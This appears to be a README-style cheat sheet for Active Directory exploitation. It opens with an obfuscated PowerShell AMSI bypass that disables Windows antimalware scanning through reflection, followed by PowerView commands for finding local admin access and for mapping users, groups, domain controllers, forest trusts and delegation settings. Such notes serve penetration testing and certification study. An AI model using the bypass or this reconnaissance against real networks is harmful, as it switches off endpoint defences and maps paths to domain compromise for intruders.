# Active-directory-small-cheatsheet
Small easy to find cheat sheet for Active directory exploitation

**Amsi bypass:-**

sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )


**Tips**

To input the output of the first command into second command use this powershell technique


<First command> | %{<Second command> -<argument> $_}
%{} is an alias for ForEach-Object{}
?{} is an alias for Where-Object{}
$_ is variable


To filter out an object type we can use this technique with pipe.

?{$_.<object> -eq '<value>’'}


##**Enumeration:-**

**To find local admin access:-**

Find-LocalAdminAccess

**To get Domain sid:-**

Get-DomainSID 

Arguments -Domain “domain name”

**To get DC:-**

Get-NetDomainController

Arguments -Domain “domain name”

**To get users in current domain:-**

Get-NetUser

Arguments  -UserName “username”




**To get user properties:-**

Get-UserProperty

Arguments -Properties pwdlastset



**Search for a particular string in a user's attributes:-**

Find-UserField -SearchField Description -SearchTerm ”built”

**To Get all computers:-**

Get-NetComputer -FullData

Many arguments -OperatingSystem -Ping -FullData

**To get groups:-**

Get-NetGroup

Arguments -FullData -Domain

**To get members of a particular group:-**

Get-NetGroupMember -GroupName "Domain Admins"



**Mapping forest:-**

Get-NetForest -Verbose

Get-NetForestDomain -Verbose





**Mapping trust:-**

Get-NetDomainTrust
 
Arguments -Domain

Get-NetForestDomain -Verbose | Get-NetDomainTrust


**Finding Constrained Delegation:-**

Get-DomainUser -TrustedToAuth (Poweview Dev.)


**Finding UnConstrained Delegation:-**

Get-NetComputer -UnConstrained



